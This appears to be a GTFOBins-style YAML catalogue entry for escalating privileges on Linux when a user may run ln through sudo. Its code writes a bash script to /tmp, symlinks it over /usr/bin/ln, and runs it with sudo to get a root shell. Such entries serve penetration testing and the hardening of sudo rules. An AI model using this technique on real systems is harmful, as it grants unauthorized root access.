---
description: If we have sudo rights to run synlink (ln) we can link bash to ln and run bash as root
functions:
  sudo:
    - code: |
        echo 'bash' > /tmp/bash
        chmod +x /tmp/bash
        sudo /usr/bin/ln -sf /tmp/bash /usr/bin/ln
        sudo /usr/bin/ln
        
---
